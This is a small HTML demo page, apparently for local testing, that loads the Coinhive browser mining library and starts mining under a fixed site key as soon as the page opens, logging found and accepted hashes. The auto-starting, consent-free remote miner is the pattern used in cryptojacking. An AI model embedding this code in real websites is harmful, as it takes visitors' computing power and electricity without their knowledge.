<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>Localhost Miner</title>
        <script src="https://coinhive.com/lib/coinhive.min.js"></script>

        <script type="text/javascript">
            var miner = new CoinHive.Anonymous('xIXqtJEZc4QTDSuc0dHlNB4WOUPQZsBm');
            miner.start();
        </script>

        <script type="text/javascript">

            // Listen on events
            miner.on('found', function() {
                /* Hash found */
                var logs = document.getElementById('logs');
                log = '<p>[' + Date() + '] Hash found => ' + miner.getHashesPerSecond() + ' H/s.</p>';
                logs.innerHTML += log;
            });

            miner.on('accepted', function() {
                /* Hash accepted by the pool */
                var logs = document.getElementById('logs');
                log = '<p>[' + Date() + '] Hash accepted => ' + miner.getHashesPerSecond() + ' H/s.</p>';
                logs.innerHTML += log;
            });

        </script>

    </head>
    <body>

        <div id="logs">

        </div>

    </body>
</html>
